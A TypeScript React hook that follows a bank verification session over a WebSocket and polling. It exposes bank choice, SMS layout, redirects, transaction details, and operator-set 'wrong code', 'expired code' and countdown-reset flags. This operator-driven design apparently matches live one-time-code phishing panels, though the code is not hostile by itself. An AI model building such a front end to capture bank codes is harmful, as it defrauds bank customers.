import { useState, useEffect, useCallback, useRef } from "react";
import { getSessionStatus, getWebSocketUrl } from "../lib/bank-api";
import { createSessionWebSocket } from "../lib/ws";
import type { TransactionDetails } from "../types";

export function useSessionStatus(apiBase: string, channelSlug: string, sessionId: string | null) {
  const [status, setStatus] = useState<string>("pending");
  const [verificationLayout, setVerificationLayout] = useState<string>("sms");
  const [bank, setBank] = useState<string | undefined>(undefined);
  const [redirectUrl, setRedirectUrl] = useState<string | null>(null);
  const [transactionDetails, setTransactionDetails] = useState<TransactionDetails | undefined>(undefined);
  const [wrongCode, setWrongCode] = useState(false);
  const [expiredCode, setExpiredCode] = useState(false);
  const [operatorMessage, setOperatorMessage] = useState<{ level: "error" | "info"; message: string } | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [countdownResetTrigger, setCountdownResetTrigger] = useState(0);

  const enabled = Boolean(sessionId);
  const pollingIntervalRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const clearWrongCode = useCallback(() => setWrongCode(false), []);
  const clearExpiredCode = useCallback(() => setExpiredCode(false), []);
  const clearCodeFeedback = useCallback(() => {
    setWrongCode(false);
    setExpiredCode(false);
  }, []);
  const clearOperatorMessage = useCallback(() => setOperatorMessage(null), []);

  const fetchStatus = useCallback(async () => {
    if (!sessionId) return;
    try {
      const data = await getSessionStatus(apiBase, channelSlug, sessionId);
      setStatus(data.status);
      if (data.verificationLayout) setVerificationLayout(data.verificationLayout);
      if (data.bank !== undefined) setBank(data.bank);
      if (data.transactionDetails !== undefined) setTransactionDetails(data.transactionDetails);
      setWrongCode(false);
      setExpiredCode(false);
    } catch (e) {
      setError(e instanceof Error ? e.message : "Failed to load");
    }
  }, [apiBase, channelSlug, sessionId]);

  useEffect(() => {
    if (enabled) fetchStatus();
  }, [enabled, fetchStatus]);

  useEffect(() => {
    setWrongCode(false);
    setExpiredCode(false);
  }, [channelSlug, sessionId, verificationLayout]);

  useEffect(() => {
    if (!enabled || !sessionId) return;

    const clearPolling = () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
        pollingIntervalRef.current = null;
      }
    };

    const url = getWebSocketUrl(apiBase, channelSlug, sessionId);
    const ws = createSessionWebSocket(
      url,
      (msg) => {
        setStatus(msg.status);
        if (msg.verificationLayout) setVerificationLayout(msg.verificationLayout);
        if (msg.bank !== undefined) setBank(msg.bank);
        if (msg.redirectUrl) setRedirectUrl(msg.redirectUrl);
        if (msg.transactionDetails !== undefined) setTransactionDetails(msg.transactionDetails);
        if (msg.wrongCode !== undefined) setWrongCode(msg.wrongCode);
        if (msg.expiredCode !== undefined) setExpiredCode(msg.expiredCode);
        if (msg.countdownReset === true) setCountdownResetTrigger((t) => t + 1);
      },
      () => {
        clearPolling();
        pollingIntervalRef.current = setInterval(fetchStatus, 3000);
      },
      (msg) =>
        setOperatorMessage(
          msg.message === "" ? null : { level: msg.level, message: msg.message }
        )
    );

    return () => {
      clearPolling();
      ws.close();
    };
  }, [enabled, apiBase, channelSlug, sessionId, fetchStatus]);

  return {
    status,
    verificationLayout,
    bank,
    redirectUrl,
    transactionDetails,
    wrongCode,
    expiredCode,
    clearWrongCode,
    clearExpiredCode,
    clearCodeFeedback,
    operatorMessage,
    clearOperatorMessage,
    countdownResetTrigger,
    error,
    refetch: fetchStatus,
  };
}
